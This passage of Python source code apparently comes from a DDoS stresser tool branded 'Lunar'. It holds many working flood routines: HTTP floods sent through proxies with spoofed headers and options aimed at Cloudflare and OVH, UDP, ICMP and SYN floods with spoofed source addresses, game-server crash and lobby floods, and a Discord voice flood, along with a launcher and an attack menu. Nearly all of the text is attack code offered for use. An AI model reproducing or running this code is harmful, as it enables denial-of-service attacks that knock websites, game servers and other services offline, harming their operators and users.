            request = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{modified_header}X-Forwarded-For: {ip}\r\n\r\n"
            prebuilt_requests.append(request)
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(5000):
                request = Choice(prebuilt_requests)
                sent = s.send(str.encode(request))
                if not sent:
                    break
            s.close()
        except:
            if s:
                s.close()

def browser(event, proxy_type):
    global proxies
    add = "?" if "?" not in path else "&"
    base_header = GenReqHeader("get").strip()
    user_agents = [getuseragent() for _ in range(20)]
    prebuilt_requests = [
        f"GET {path + add + randomurl()} HTTP/1.1\r\nHost: {target}\r\n{base_header}\r\nUser-Agent: {ua}\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nAccept-Language: en-US,en;q=0.9\r\n\r\n"
        for ua in user_agents
    ]
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(5000):
                request = Choice(prebuilt_requests)
                sent = s.send(str.encode(request))
                if not sent:
                    break
            s.close()
        except:
            if s:
                s.close()

def home(event, proxy_type):
    global proxies
    add = "?" if "?" not in path else "&"
    base_header = GenReqHeader("get")
    spoofed_ips = [spoof_source_ip() for _ in range(15)]
    prebuilt_requests = [
        f"GET {path + add + randomurl()} HTTP/1.1\r\nHost: {target}\r\n{base_header}X-Forwarded-For: {ip}\r\nAccept-Encoding: gzip, deflate, br\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"
        for ip in spoofed_ips
    ]
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(5000):
                request = Choice(prebuilt_requests)
                sent = s.send(str.encode(request))
                if not sent:
                    break
            s.close()
        except:
            if s:
                s.close()

def cfbypass(event, proxy_type):
    global proxies
    add = "?" if "?" not in path else "&"
    base_header = GenReqHeader("get")
    user_agents = [getuseragent() for _ in range(20)]
    spoofed_ips = [spoof_source_ip() for _ in range(20)]
    prebuilt_requests = []
    for ua in user_agents:
        for ip in spoofed_ips:
            modified_header = base_header.replace('User-Agent: ', f'User-Agent: {ua}\r\n')
            request = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{modified_header}X-Forwarded-For: {ip}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-User: ?1\r\nSec-Fetch-Dest: document\r\n\r\n"
            prebuilt_requests.append(request)
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(5000):
                request = Choice(prebuilt_requests)
                sent = s.send(str.encode(request))
                if not sent:
                    break
            s.close()
        except:
            if s:
                s.close()

def tls(event, proxy_type):
    global proxies
    add = "?" if "?" not in path else "&"
    base_header = GenReqHeader("get")
    prebuilt_requests = [
        f"GET {path + add + randomurl()} HTTP/1.1\r\nHost: {target}\r\n{base_header}Accept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nSec-Ch-Ua: \"Chromium\";v=\"{random.randint(90, 120)}\", \"Not;A=Brand\";v=\"8\"\r\n\r\n"
        for _ in range(20)
    ]
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_3)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(5000):
                request = Choice(prebuilt_requests)
                sent = s.send(str.encode(request))
                if not sent:
                    break
            s.close()
        except:
            if s:
                s.close()

def udp_kill(event, proxy_type, target_ip, target_port):
    global proxies
    # Increased payload variety and size
    payloads = [
        generate_random_payload(2048),
        generate_random_payload(4096),
        generate_random_payload(8192),
        b"FUCKYOU" * 1000 + b"ATTACK", # Using a swear word from the list and more data
    ]
    spoofed_sources = [spoof_source_ip() for _ in range(100)] # Increased spoofed IPs
    event.wait()
    while event.is_set(): # Keep sending while the event is set
        s = None
        try:
            proxy = Choice(proxies)
            s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
            proxy_ip, proxy_port = proxy.split(":")
            if proxy_type == 4:
                s.set_proxy(socks.SOCKS4, proxy_ip, int(proxy_port))
            elif proxy_type == 5:
                s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
            elif proxy_type == 0:
                s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1) # Keep broadcast flag
            s.settimeout(2)

            # Send continuously
            while event.is_set():
                payload = Choice(payloads)
                source_ip = Choice(spoofed_sources)
                 # Bind to spoofed source IP and random port before sending
                s.bind((source_ip, Intn(1024, 65535)))
                s.sendto(payload, (target_ip, target_port))
                time.sleep(0.005) # Small delay

        except:
            if s:
                s.close()
            time.sleep(0.1) # Small delay before trying again

def ovh(event, proxy_type):
    global proxies
    add = "?" if "?" not in path else "&"
    base_header = GenReqHeader("get")
    user_agents = [getuseragent() for _ in range(25)]
    spoofed_ips = [spoof_source_ip() for _ in range(25)]
    prebuilt_requests = []
    for ua in user_agents:
        for ip in spoofed_ips:
            modified_header = base_header.replace('User-Agent: ', f'User-Agent: {ua}\r\n')
            request = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{modified_header}X-Forwarded-For: {ip}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-Mode: navigate\r\nSec-Ch-Ua-Platform: \"Windows\"\r\nSec-Ch-Ua-Mobile: ?0\r\n\r\n"
            prebuilt_requests.append(request)
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(5000):
                request = Choice(prebuilt_requests)
                sent = s.send(str.encode(request))
                if not sent:
                    break
            s.close()
        except:
            if s:
                s.close()

def dgb(event, proxy_type):
    global proxies
    add = "?" if "?" not in path else "&"
    base_header = GenReqHeader("get")
    user_agents = [getuseragent() for _ in range(30)]
    spoofed_ips = [spoof_source_ip() for _ in range(30)]
    prebuilt_requests = []
    for ua in user_agents:
        for ip in spoofed_ips:
            modified_header = base_header.replace('User-Agent: ', f'User-Agent: {ua}\r\n')
            request = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{modified_header}X-Forwarded-For: {ip}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nSec-Fetch-Site: none\r\nSec-Fetch-Mode: cors\r\nSec-Fetch-Dest: empty\r\nOrigin: https://{target}\r\n\r\n"
            prebuilt_requests.append(request)
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_3)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(5000):
                request = Choice(prebuilt_requests)
                sent = s.send(str.encode(request))
                if not sent:
                    break
            s.close()
        except:
            if s:
                s.close()

def http_storm(event, proxy_type):
    global proxies
    add = "?" if "?" not in path else "&"
    base_header = GenReqHeader("get")
    user_agents = [getuseragent() for _ in range(50)]
    spoofed_ips = [spoof_source_ip() for _ in range(50)]
    methods = ["GET", "HEAD", "OPTIONS"]
    prebuilt_requests = []
    for method in methods:
        for ua in user_agents:
            for ip in spoofed_ips:
                modified_header = base_header.replace('User-Agent: ', f'User-Agent: {ua}\r\n')
                request = f"{method} {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{modified_header}X-Forwarded-For: {ip}\r\nAccept-Encoding: gzip, deflate, br, zstd\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-Mode: no-cors\r\nPriority: u=0, i\r\n\r\n"
                prebuilt_requests.append(request)
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_3)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(5000):
                request = Choice(prebuilt_requests)
                sent = s.send(str.encode(request))
                if not sent:
                    break
            s.close()
        except:
            if s:
                s.close()

def api_killer(event, proxy_type):
    global proxies
    add = "?" if "?" not in path else "&"
    base_header = GenReqHeader("post")
    user_agents = [getuseragent() for _ in range(50)]
    spoofed_ips = [spoof_source_ip() for _ in range(50)]
    payloads = [
        '{"data": "' + ''.join(random.choices(string.ascii_letters + string.digits, k=1000)) + '"}',
        '{"query": "' + ''.join(random.choices(string.ascii_letters + string.digits, k=500)) + '"}',
        '{"input": "' + ''.join(random.choices(string.ascii_letters + string.digits, k=1500)) + '"}'
    ]
    prebuilt_requests = []
    for payload in payloads:
        for ua in user_agents:
            for ip in spoofed_ips:
                modified_header = base_header.replace('User-Agent: ', f'User-Agent: {ua}\r\n')
                request = f"POST {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{modified_header}X-Forwarded-For: {ip}\r\nContent-Type: application/json\r\nContent-Length: {len(payload)}\r\nAccept: application/json\r\nOrigin: https://{target}\r\n\r\n{payload}"
                prebuilt_requests.append(request)
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_3)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(5000):
                request = Choice(prebuilt_requests)
                sent = s.send(str.encode(request))
                if not sent:
                    break
            s.close()
        except:
            if s:
                s.close()

def icmp_blast(event, proxy_type, target_ip, target_port):
    global proxies
    payloads = [
        generate_random_payload(64),
        generate_random_payload(128),
        generate_random_payload(256),
    ]
    spoofed_sources = [spoof_source_ip() for _ in range(100)]
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = socks.socksocket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            proxy_ip, proxy_port = proxy.split(":")
            if proxy_type == 4:
                s.set_proxy(socks.SOCKS4, proxy_ip, int(proxy_port))
            elif proxy_type == 5:
                s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
            elif proxy_type == 0:
                s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.settimeout(2)
            for _ in range(2000):
                payload = Choice(payloads)
                source_ip = Choice(spoofed_sources)
                icmp_packet = (
                    b"\x08\x00" +
                    b"\x00\x00" +
                    os.urandom(4) +
                    payload
                )
                s.sendto(icmp_packet, (target_ip, 0))
                s.bind((source_ip, Intn(1024, 65535)))
            s.close()
        except:
            if s:
                s.close()

def syn_strike(event, proxy_type, target_ip, target_port):
    global proxies
    spoofed_sources = [spoof_source_ip() for _ in range(100)]
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            for _ in range(2000):
                source_ip = Choice(spoofed_sources)
                s.bind((source_ip, Intn(1024, 65535)))
                s.connect((target_ip, target_port))
                s.send(b"\x00" * 20)
            s.close()
        except:
            if s:
                s.close()

def game_crash(event, proxy_type, target_ip, target_port):
    global proxies
    common_game_ports = [25565, 27015, 7777, 19132]  # Minecraft, Source, Unreal, Bedrock
    payloads = [
        generate_minecraft_payload(),
        generate_source_payload(),
        generate_unreal_payload(),
        b"\xFF\xFF\xFF\xFF" + os.urandom(random.randint(64, 8192)),
        b"\x00\x00" + os.urandom(random.randint(64, 8192)),
        b"\xFE\xFD" + os.urandom(random.randint(64, 8192)),
    ]
    spoofed_sources = [spoof_source_ip() for _ in range(1000)]  # Increased spoofed IPs
    event.wait()
    while event.is_set():
        s = None
        try:
            proxy = Choice(proxies)
            s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
            proxy_ip, proxy_port = proxy.split(":")
            if proxy_type == 4:
                s.set_proxy(socks.SOCKS4, proxy_ip, int(proxy_port))
            elif proxy_type == 5:
                s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
            elif proxy_type == 0:
                s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.settimeout(1)  # Reduced timeout
            target_port = target_port if target_port else random.choice(common_game_ports)
            for _ in range(5000):  # Increased packet count
                payload = Choice(payloads)
                source_ip = Choice(spoofed_sources)
                s.bind((source_ip, Intn(1024, 65535)))
                s.sendto(payload, (target_ip, target_port))
                time.sleep(0.001)  # Faster packet rate
            s.close()
        except:
            if s:
                s.close()
            time.sleep(0.05)

async def async_lobby_flood(s, target_ip, target_port, payloads, spoofed_sources):
    try:
        for _ in range(5000):  # Increased connection count
            payload = Choice(payloads)
            source_ip = Choice(spoofed_sources)
            s.bind((source_ip, Intn(1024, 65535)))
            s.send(payload)
            if random.random() < 0.2:  # Increased reconnect rate
                s.close()
                s = setup_socket(proxy_type, proxy)
                s.connect((target_ip, target_port))
            await asyncio.sleep(0.001)  # Async delay
    except:
        if s:
            s.close()

def lobby_flood(event, proxy_type, target_ip, target_port):
    global proxies
    payloads = [
        generate_minecraft_payload(),
        generate_source_payload(),
        b"\x01\x00" + os.urandom(random.randint(16, 256)),
        b"\x02\x00" + os.urandom(random.randint(32, 512)),
        b"\x00\x01" + os.urandom(random.randint(64, 1024)),
    ]
    spoofed_sources = [spoof_source_ip() for _ in range(1000)]  # Increased spoofed IPs
    event.wait()
    while event.is_set():
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.settimeout(2)  # Reduced timeout
            s.connect((target_ip, target_port))
            asyncio.run(async_lobby_flood(s, target_ip, target_port, payloads, spoofed_sources))
            s.close()
        except:
            if s:
                s.close()
            time.sleep(0.05)

def discord(event, proxy_type, target_ip, target_port):
    global proxies
    payloads = [
        b"\x00\x00" + os.urandom(128),
        b"\xFF\xFF" + os.urandom(64),
        b"\x01\x01" + os.urandom(256),
    ]
    spoofed_sources = [spoof_source_ip() for _ in range(50)]
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((target_ip, target_port))
            for _ in range(2000):
                payload = Choice(payloads)
                source_ip = Choice(spoofed_sources)
                s.bind((source_ip, Intn(1024, 65535)))
                s.send(payload)
            s.close()
        except:
            if s:
                s.close()

def spoof_source_ip():
    return f"{Intn(1, 255)}.{Intn(0, 255)}.{Intn(0, 255)}.{Intn(0, 255)}"

def generate_random_payload(size):
    return os.urandom(size)

def parse_discord_link(link):
    try:
        if "discord" not in link:
            return None, None
        return "voice.discord.com", 443
    except:
        return None, None

def Launch(method, url, threads, duration, proxy_type, port=None):
    global target, path, protocol, proxies
    event = threading.Event()
    clearcs()

    if not load_proxies():
        return False

    print(f"""{Colorate.Horizontal(Colors.cyan_to_blue, "             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═")}
{Colorate.Horizontal(Colors.cyan_to_blue, "             ╠═╣ ║  ║ ╠═╣║  ╠╩╗")}
{Colorate.Horizontal(Colors.cyan_to_blue, "             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩")}
{white}  ⋆.˚ ☾ .⭒˚ 𝓑𝓮𝓼𝓽 𝓬𝓱𝓮𝓪𝓹 𝓼𝓽𝓻𝓮𝓼𝓼𝓮𝓻 ⋆.˚ ☾ .⭒˚
{Colorate.Horizontal(Colors.cyan_to_blue, "╔═══════════════════════════════════════════╗")}
{Colorate.Horizontal(Colors.cyan_to_blue, "║")} {white}𝓐𝓽𝓽𝓪𝓬𝓴 𝓢𝓾𝓶𝓶𝓪𝓻𝔂 {Colorate.Horizontal(Colors.cyan_to_blue, "                           ║")}
{Colorate.Horizontal(Colors.cyan_to_blue, "╠═══╦═══════════════════════════════════════╣")}
{Colorate.Horizontal(Colors.cyan_to_blue, "║ ● ║")} {white}ᴛᴀʀɢᴇᴛ {Colorate.Horizontal(Colors.cyan_to_blue, "    ➤")}  {(url if method in ['cc', 'post', 'head', 'uambypass', 'browser', 'home', 'cfbypass', 'tls', 'ovh', 'dgb', 'http-storm', 'api-killer', 'kill'] else url).ljust(30)}
{Colorate.Horizontal(Colors.cyan_to_blue, "║ ● ║")} {white}ᴍᴇᴛʜᴏᴅ {Colorate.Horizontal(Colors.cyan_to_blue, "    ➤")}  {method.ljust(30)}
{Colorate.Horizontal(Colors.cyan_to_blue, "║ ● ║")} {white}ᴘᴏʀᴛ {Colorate.Horizontal(Colors.cyan_to_blue, "      ➤")}  {str(port).ljust(30)}
{Colorate.Horizontal(Colors.cyan_to_blue, "║ ● ║")} {white}ᴛɪᴍᴇ {Colorate.Horizontal(Colors.cyan_to_blue, "      ➤")}  {str(duration).ljust(30)}
{Colorate.Horizontal(Colors.cyan_to_blue, "║ ● ║")} {white}ᴛʜʀᴇᴀᴅ {Colorate.Horizontal(Colors.cyan_to_blue, "    ➤")}  {str(threads).ljust(30)}
{Colorate.Horizontal(Colors.cyan_to_blue, "╠═══╬═══════════════════════════════════════╣")}
{Colorate.Horizontal(Colors.cyan_to_blue, "║ ● ║")} {white}ᴀᴄᴄᴇꜱꜱ     {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}  VIP
{Colorate.Horizontal(Colors.cyan_to_blue, "╠═══╬═══════════════════════════════════════╣")}
{Colorate.Horizontal(Colors.cyan_to_blue, "║ ● ║")} {white}ᴄʜᴇᴄᴋʜᴏꜱᴛ  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}  https://check-host.net/check-http?host={(url if method in ['cc', 'post', 'head', 'uambypass', 'browser', 'home', 'cfbypass', 'tls', 'ovh', 'dgb', 'http-storm', 'api-killer', 'kill'] else url)}
{Colorate.Horizontal(Colors.cyan_to_blue, "╚═══╩═══════════════════════════════════════╝")}""")

    if method in ["udpflood", "tcpflood", "dns", "udp-kill", "icmp-blast", "syn-strike", "game-crash", "lobby-flood"]:
        if not ParseUrl(url, is_layer4=True):
            return False
        target_ip = target
        target_port = port if port else 80
    elif method == "discord":
        target_ip, target_port = parse_discord_link(url)
        if not target_ip:
            print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid Discord link or unable to resolve voice server."))
            return False
        target_port = port if port else target_port
    else: # This handles L7 methods including the new 'kill'
        if not ParseUrl(url):
            return False
        target_ip = target # For L7, target is the hostname/IP from the URL
        target_port = port if port else port # Use provided port or default from ParseUrl


    build_threads(method, threads, event, proxy_type, target_ip, target_port)
    event.set()
    time.sleep(duration)
    event.clear()
    print(Colorate.Horizontal(Colors.cyan_to_blue, f"> Attack {method.upper()} finished."))
    return True

def main():
    global proxies, thread_num, out_file
    proxies = []
    out_file = "proxies.txt"
    thread_num = 1500

    clearcs()
    bannerm()

    while True:
        command = input(Colorate.Horizontal(Colors.cyan_to_blue, """┌─[ʟᴜɴᴀʀxᴅ]─[~]
└──╼ ➤ """)).strip().lower()

        if command:
            if command in ["methods", "help", "menu"]:
                try:
                    play_ascii_video("banner.mp4", duration=2.5)
                    clearcs()
                except:
                    clearcs()
                    runbanner()
            else:
                try:
                    clearcs()
                    play_ascii_video("sent.mp4", duration=2.5)
                    clearcs()
                except:
                    runbanner()

        if command == "help":
            print(f"""{Colorate.Horizontal(Colors.cyan_to_blue, "                ╦ ╦╔═╗╦  ╔═╗  ")}
{Colorate.Horizontal(Colors.cyan_to_blue, "                ╠═╣║╣ ║  ╠═╝  ")}
{Colorate.Horizontal(Colors.cyan_to_blue, "                ╩ ╩╚═╝╩═╝╩    ")}
{white}       ⏾⋆.˚ 𝓑𝓮𝓼𝓽 𝓯𝓻𝓮𝓮 𝓭𝓭𝓸𝓼 𝓽𝓸𝓸𝓵   ⏾⋆.˚
{Colorate.Horizontal(Colors.cyan_to_blue, "     ═╦══════════════════════════════╦═")}
{Colorate.Horizontal(Colors.cyan_to_blue, "      ║")} {white}[●] secret ➤ Exit        {Colorate.Horizontal(Colors.cyan_to_blue, "    ║")} 
{Colorate.Horizontal(Colors.cyan_to_blue, "      ║")} {white}[●] help ➤ Show help message {Colorate.Horizontal(Colors.cyan_to_blue, "║")} 
{Colorate.Horizontal(Colors.cyan_to_blue, "      ║")} {white}[●] methods ➤ List methods   {Colorate.Horizontal(Colors.cyan_to_blue, "║")} 
{Colorate.Horizontal(Colors.cyan_to_blue, "      ║")} {white}[●] menu ➤ Show the menu     {Colorate.Horizontal(Colors.cyan_to_blue, "║")} 
{Colorate.Horizontal(Colors.cyan_to_blue, "     ═╩══════════════════════════════╩═")}
""")

        elif command == "methods":
            print(f"""
{cyan_to_blue("╔══════════════════════════════╦════════════════════════════════════════════════════════╦═══════════════════════╗")}
{cyan_to_blue("‖")} {cyan_to_pink("░░░░░░░░░░░░░░░░░░░░░░░░░░░░ ")}{cyan_to_blue("‖")} {gold_to_white("[LAYER 7]                                              ")}{cyan_to_blue("‖")} {gold_to_white("                      ")}{cyan_to_blue("‖")}
{cyan_to_blue("║")} {cyan_to_pink("░")} {cyan_to_blue("╔══════════════════════╗")} {cyan_to_pink("░")}{cyan_to_blue(" ‖")} {gold_to_white("[●]")} {cyan_to_pink(".l7 cc........ ")}{cyan_to_pink("<link> <threads> <time> <port>")}      {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {cyan_to_pink("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")} {cyan_to_pink("  ‖ ░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l7 kill...... ")}{cyan_to_pink("<link> <threads> <time> <port>")}      {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {cyan_to_pink("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")} {cyan_to_pink("  ‖ ░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l7 post...... ")}{cyan_to_pink("<link> <threads> <time> <port>")}      {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {cyan_to_pink("⣿⣿⣿⣿⣿⣿⠿⠿⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿")} {cyan_to_pink("  ‖ ░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l7 head...... ")}{cyan_to_pink("<link> <threads> <time> <port>")}      {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {cyan_to_pink("⣿⣿⣿⣿⣿⣿⠏⠀⢐⣿⣿⣿⣿⣿⣿⣿⣿⣿")} {cyan_to_pink("  ‖ ░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l7 browser... ")}{cyan_to_pink("<link> <threads> <time> <port>")}      {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {cyan_to_pink("⣿⣿⣿⣿⣿⣿⡿⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿")} {cyan_to_pink("  ‖ ░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l7 home...... ")}{cyan_to_pink("<link> <threads> <time> <port>")}      {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {cyan_to_pink("⣿⣿⣿⣿⣿⣿⣇⠀⢰⣿⡌⠀⢹⣿⣿⣿⣿⣿")} {cyan_to_pink("  ‖ ░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l7 tls....... ")}{cyan_to_pink("<link> <threads> <time> <port>")}      {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {cyan_to_pink("⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿")} {cyan_to_pink("  ‖ ░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l7 ovh....... ")}{cyan_to_pink("<link> <threads> <time> <port>")}      {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {cyan_to_pink("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")} {cyan_to_pink("  ‖ ░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l7 http-storm ")}{cyan_to_pink("<link> <threads> <time> <port>")}      {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {cyan_to_pink("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")} {cyan_to_pink("  ‖ ░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l7 api-killer ")}{cyan_to_pink("<link> <threads> <time> <port>")}      {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("╠══════════════════════╣")} {cyan_to_pink("░")} {cyan_to_blue("╠════════════════════════════════════════════════════════╬═══════════════════════╣")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║                      ║")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[LAYER 4]                                              ")}{cyan_to_blue("‖")} {gold_to_white("                      ")}{cyan_to_blue("‖")}
{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║")} {blue(" 𝓦𝓮𝓵𝓬𝓸𝓶𝓮")} {pink("𝓽𝓸")} {pink("𝓛𝓾𝓷𝓪𝓻")} !  {cyan_to_blue("║")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l4 udpflood.. ")}{cyan_to_pink("<ip> <threads> <time> <port>")}        {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
